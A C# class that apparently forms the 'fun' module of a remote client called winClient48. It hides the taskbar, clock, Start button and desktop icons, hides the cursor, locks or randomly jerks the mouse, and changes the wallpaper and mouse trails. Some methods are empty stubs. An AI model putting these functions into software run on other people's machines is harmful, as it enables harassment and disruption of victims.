using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics.Eventing.Reader;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    internal class clsfnFun
    {
        private static readonly Random rng = new Random();

        public clsfnFun()
        {
            System.Windows.Forms.Timer timerCheckStatus = new System.Windows.Forms.Timer();
            timerCheckStatus.Tick += TimerCheckStatus_Tick;
        }

        public bool m_bMouseVisible { get; set; }
        public bool m_bMouseLock { get { return _m_bMouseLock; } }
        private bool _m_bMouseLock = false;
        public bool m_bMouseCrazy { get { return _m_bMouseCrazy; } }
        private bool _m_bMouseCrazy = false;
        public bool m_bMouseTrail
        {
            get
            {
                try
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse"))
                    {
                        if (key == null)
                            return false;

                        object v = key.GetValue("MouseTrails");
                        if (v == null)
                            return false;

                        if (int.TryParse(v.ToString(), out int trails))
                        {
                            return trails > 0;
                        }

                        return false;
                    }
                }
                catch
                {
                    return false;
                }
            }
        }

        public bool bMouseVisible
        {
            get
            {
                WinAPI.CURSORINFO cursorInfo = new WinAPI.CURSORINFO();
                cursorInfo.cbSize = Marshal.SizeOf(typeof(WinAPI.CURSORINFO));

                if (WinAPI.GetCursorInfo(ref cursorInfo))
                {
                    return (cursorInfo.flags & WinAPI.CURSOR_SHOWING) != 0;
                }

                return false;
            }
        }
        public bool bHideClock
        {
            get
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindowEx(
                        WinAPI.FindWindow("Shell_TrayWnd", null),
                        IntPtr.Zero,
                        "TrayNotifyWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "TrayClockWClass",
                    null
                );

                return !WinAPI.IsWindowVisible(hWnd);
            }
        }
        public bool bHideTray
        {
            get
            {
                IntPtr hWnd = WinAPI.FindWindow("Shell_TrayWnd", null);
                return !WinAPI.IsWindowVisible(hWnd);
            }
        }
        public bool bHideStartOrb
        {
            get
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                        "Shell_TrayWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "Start",
                    null
                );

                return !WinAPI.IsWindowVisible(hWnd);
            }
        }
        public bool bHideDesktopIcon
        {
            get
            {
                IntPtr defView = fnGetDesktopListView();
                if (defView == IntPtr.Zero)
                    return false;

                return !WinAPI.IsWindowVisible(defView);
            }
        }
        public bool bHideTaskbar
        {
            get
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                            "Shell_TrayWnd",
                            null
                        ),
                    IntPtr.Zero,
                    "ReBarWindow32",
                    null
                );

                return !WinAPI.IsWindowVisible(hWnd);
            }
        }

        public void TimerCheckStatus_Tick(object sender, EventArgs e)
        {

        }

        private IntPtr fnGetDesktopListView()
        {
            IntPtr progman = WinAPI.FindWindow("Progman", null);

            IntPtr defView = WinAPI.FindWindowEx(
                progman,
                IntPtr.Zero,
                "SHELLDLL_DefView",
                null
            );

            if (defView != IntPtr.Zero)
                return defView;

            // Win8+ : search WorkerW
            IntPtr workerW = IntPtr.Zero;
            while ((workerW = WinAPI.FindWindowEx(
                IntPtr.Zero,
                workerW,
                "WorkerW",
                null
            )) != IntPtr.Zero)
            {
                defView = WinAPI.FindWindowEx(
                    workerW,
                    IntPtr.Zero,
                    "SHELLDLL_DefView",
                    null
                );

                if (defView != IntPtr.Zero)
                    return defView;
            }

            return IntPtr.Zero;
        }

        /// <summary>
        /// Return current wallpaper image object.
        /// </summary>
        /// <returns></returns>
        public (int, string, Image) GetWallpaper()
        {
            int code = 1;
            string msg = string.Empty;
            Image img = null;

            try
            {
                string szSrcPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Themes\TranscodedWallpaper");
                img = Image.FromFile(szSrcPath);
            }
            catch (Exception ex)
            {
                msg = ex.GetType().Name + "|" + ex.Message;
                code = 0;
            }

            return (code, msg, img);
        }

        /// <summary>
        /// Change wallpaper from input image object.
        /// </summary>
        /// <returns></returns>
        public (int, string) SetWallpaper(Image img)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                if (img == null)
                    throw new Exception("Image object cannot be null");

                string szTempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".jpg");

                Rectangle totalBounds = Screen.AllScreens.Select(s => s.Bounds).Aggregate(Rectangle.Union);

                using (Bitmap bmp = new Bitmap(totalBounds.Width, totalBounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        Color color = ((Bitmap)img).GetPixel(0, 0);
                        g.Clear(color);

                        float ratio = Math.Min((float)bmp.Width / img.Width, (float)bmp.Height / img.Height);

                        int w = (int)(img.Width * ratio);
                        int h = (int)(img.Height * ratio);
                        int x = (bmp.Width - w) / 2;
                        int y = (bmp.Height - h) / 2;

                        g.DrawImage(img, new Rectangle(x, y, w, h));
                    }

                    bmp.Save(szTempPath, ImageFormat.Bmp);

                    if (!File.Exists(szTempPath))
                        throw new Exception("Image not found.");

                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
                    {
                        key.SetValue("WallpaperStyle", "10"); //Fill
                        key.SetValue("TileWallpaper", "0");
                    }

                    bool bResult = WinAPI.SystemParametersInfo(20, 0, szTempPath, 0x01 | 0x02) == 1;
                    if (!bResult)
                        throw new Exception("SystemParametersInfo failed.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                msg = ex.Message;
                code = 0;
            }

            return (code, msg);
        }

        #region Monitor

        public (int, string) LockScreen(Image img)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {

            }
            catch (Exception ex)
            {
                msg = ex.Message;
                code = 0;
            }

            return (code, msg);
        }

        public (int, string) UnlockScreen()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {

            }
            catch (Exception ex)
            {
                msg = ex.Message;
                code = 0;
            }

            return (code, msg);
        }

        public (int, string) SetMonitorOrientation()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {

            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        #endregion

        #region HWND

        public (int, string) HideTray()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindow("Shell_TrayWnd", null);
                WinAPI.ShowWindow(hWnd, WinAPI.SW_HIDE);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) ShowTray()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindow("Shell_TrayWnd", null);
                WinAPI.ShowWindow(hWnd, WinAPI.SW_SHOW);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) FlipFlopTray()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindow("Shell_TrayWnd", null);
                if (hWnd == IntPtr.Zero)
                    throw new Exception("Null handle");

                bool bVisible = WinAPI.IsWindowVisible(hWnd);
                (code, msg) = bVisible ? HideTray() : ShowTray();
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string) HideTaskbar()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                            "Shell_TrayWnd",
                            null
                        ),
                    IntPtr.Zero,
                    "ReBarWindow32",
                    null
                );

                WinAPI.ShowWindow(hWnd, WinAPI.SW_HIDE);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) ShowTaskbar()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                            "Shell_TrayWnd",
                            null
                        ),
                    IntPtr.Zero,
                    "ReBarWindow32",
                    null
                );

                WinAPI.ShowWindow(hWnd, WinAPI.SW_SHOW);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) FlipFlopTaskbar()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                            "Shell_TrayWnd",
                            null
                        ),
                    IntPtr.Zero,
                    "ReBarWindow32",
                    null
                );

                if (IntPtr.Zero == hWnd)
                    throw new Exception("Null handle");

                bool bVisible = WinAPI.IsWindowVisible(hWnd);
                (code, msg) = bVisible ? HideTaskbar() : ShowTaskbar();
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string) HideStartOrb()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                        "Shell_TrayWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "Start",
                    null
                );

                WinAPI.ShowWindow(hWnd, WinAPI.SW_HIDE);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) ShowStartOrb()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                        "Shell_TrayWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "Start",
                    null
                );

                WinAPI.ShowWindow(hWnd, WinAPI.SW_SHOW);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) FlipFlopStartOrb()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindow(
                        "Shell_TrayWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "Start",
                    null
                );

                if (hWnd == IntPtr.Zero)
                    throw new Exception("Null handle");

                bool bVisible = WinAPI.IsWindowVisible(hWnd);
                (code, msg) = bVisible ? HideStartOrb() : ShowStartOrb();
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string) HideClock()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindowEx(
                        WinAPI.FindWindow("Shell_TrayWnd", null),
                        IntPtr.Zero,
                        "TrayNotifyWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "TrayClockWClass",
                    null
                );

                if (!WinAPI.ShowWindow(hWnd, WinAPI.SW_HIDE))
                    throw new Exception("HideClock() error");
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) ShowClock()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindowEx(
                        WinAPI.FindWindow("Shell_TrayWnd", null),
                        IntPtr.Zero,
                        "TrayNotifyWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "TrayClockWClass",
                    null
                );

                if (!WinAPI.ShowWindow(hWnd, WinAPI.SW_SHOW))
                    throw new Exception("ShowClock() error");
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }
        public (int, string) FlipFlopClock()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = WinAPI.FindWindowEx(
                    WinAPI.FindWindowEx(
                        WinAPI.FindWindow("Shell_TrayWnd", null),
                        IntPtr.Zero,
                        "TrayNotifyWnd",
                        null
                    ),
                    IntPtr.Zero,
                    "TrayClockWClass",
                    null
                );

                if (hWnd == IntPtr.Zero)
                    throw new Exception("Null handle");

                bool bVisible = WinAPI.IsWindowVisible(hWnd);
                (code, msg) = bVisible ? HideClock() : ShowClock();
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string) HideDesktopIcon()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = fnGetDesktopListView();
                if (hWnd == IntPtr.Zero)
                    throw new Exception("Cannot find desktop ListView");

                if (!WinAPI.ShowWindow(hWnd, WinAPI.SW_HIDE))
                    throw new Exception("ShowWindow() error");
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }

        public (int, string) ShowDesktopIcon()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = fnGetDesktopListView();
                if (hWnd == IntPtr.Zero)
                    throw new Exception("Cannot find desktop ListView");

                if (!WinAPI.ShowWindow(hWnd, WinAPI.SW_SHOW))
                    throw new Exception("ShowWindow() error");
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }

        public (int, string) FlipFlopDesktopIcon()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                IntPtr hWnd = fnGetDesktopListView();
                if (hWnd == IntPtr.Zero)
                    throw new Exception("Cannot find desktop ListView");

                bool hidden = bHideDesktopIcon;
                (code, msg) = hidden ? ShowDesktopIcon() : HideDesktopIcon();
            }
            catch (Exception ex)
            {
                code = 0;
                msg = $"{ex.GetType().Name}|{ex.Message}";
            }

            return (code, msg);
        }

        #endregion
        #region Message

        public (int, string) ShowBalloonTip(Icon sysIcon, ToolTipIcon toolIcon, int nTimeout, string szCaption, string szText)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                NotifyIcon notify = new NotifyIcon()
                {
                    Icon = sysIcon,
                    Visible = true
                };
                notify.ShowBalloonTip(nTimeout, szCaption, szText, toolIcon);
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        #endregion
        #region Cursor

        public (int, string) HideMouse()
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                while (WinAPI.ShowCursor(false) >= 0) ;

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }
        public (int, string) ShowMouse()
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                while (WinAPI.ShowCursor(true) < 0) ;

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }

        public bool IsMouseVisible()
        {
            int count = WinAPI.ShowCursor(true); // +1
            bool visible = count >= 0;

            WinAPI.ShowCursor(false); // -1

            return visible;
        }

        public (int, string) FlipFlopHideMouse()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                int count = WinAPI.ShowCursor(true);
                bool visible = count >= 0;
                WinAPI.ShowCursor(false);

                if (visible)
                {
                    while (WinAPI.ShowCursor(false) >= 0) ;
                }
                else
                {
                    while (WinAPI.ShowCursor(true) < 0) ;
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message;
                code = 0;
            }

            return (code, msg);
        }

        public (int, string) FlipFlopMouseCrazy()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                if (m_bMouseCrazy)
                {
                    //set false
                    _m_bMouseCrazy = false;
                }
                else
                {
                    //set true
                    _m_bMouseCrazy = true;

                    new Thread(() =>
                    {
                        while (m_bMouseCrazy)
                        {
                            Screen screen = Screen.PrimaryScreen;
                            Rectangle rtArea = screen.WorkingArea;

                            int nNewX = rng.Next(0, rtArea.Width);
                            int nNewY = rng.Next(0, rtArea.Height);

                            WinAPI.SetCursorPos(nNewX, nNewY);

                            Thread.Sleep(100);
                        }
                    }).Start();
                }
            }
            catch (Exception ex)
            {
                msg = ex.Message;
                code = 0;
            }

            return (code, msg);
        }

        public (int, string) FlipFlopMouseTrails()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                uint uLength = 5u;

                uLength = m_bMouseTrail ? 0u : uLength;

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Mouse", true))
                {
                    if (key == null)
                        throw new Exception("Null registry key"); 

                    if (m_bMouseTrail)
                    { 
                        //set false
                        key.SetValue("MouseTrails", "0"); 
                    } 
                    else 
                    { 
                        //set true
                        key.SetValue("MouseTrails", uLength.ToString()); 
                    } 
                }

                bool bResult = WinAPI.SystemParametersInfo(
                    0x005D,
                    uLength,
                    (uint)IntPtr.Zero,
                    0x01 | 0x02
                );

                if (!bResult)
                    throw new Exception($"SystemParametersInfo() error: {WinAPI.GetLastError()}");
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;

                MessageBox.Show(ex.Message);
            }

            return (code, msg);
        }

        public (int, string) FlipFlopMouseLock()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                
                if (m_bMouseLock)
                {
                    //set false
                    _m_bMouseLock = false;
                }
                else
                {
                    //set true
                    _m_bMouseLock = true;

                    WinAPI.POINT position;
                    if (!WinAPI.GetCursorPos(out position))
                        throw new Exception("GetCursorPos() error");

                    new Thread(() =>
                    {
                        while (m_bMouseLock)
                        {
                            WinAPI.SetCursorPos(position.X, position.Y);
                            Thread.Sleep(100);
                        }
                    }).Start();
                }
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string, Bitmap) GetCursorIcon()
        {
            int code = 1;
            string msg = string.Empty;
            Bitmap bmp = null;

            try
            {
                IntPtr hCursor = WinAPI.GetCursor();
                if (IntPtr.Zero == hCursor)
                    throw new Exception("hCursor is null handle.");

                Cursor cursor = new Cursor(WinAPI.CopyCursor(hCursor));
                bmp = new Bitmap(cursor.Size.Width, cursor.Size.Height);

                using (Graphics graphics = Graphics.FromImage(bmp))
                {
                    cursor.Draw(graphics, new Rectangle(Point.Empty, cursor.Size));
                    graphics.DrawImage(bmp, Point.Empty);
                }
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg, bmp);
        }
        public (int, string) SetCursorIcon(Image img)
        {
            int code = 1;
            string msg = string.Empty;

            try
            {
                
            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        public (int, string) GetCursorSize()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {

            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }
        public (int, string) SetCursorSize()
        {
            int code = 1;
            string msg = string.Empty;

            try
            {

            }
            catch (Exception ex)
            {
                code = 0;
                msg = ex.Message;
            }

            return (code, msg);
        }

        #endregion
    }
}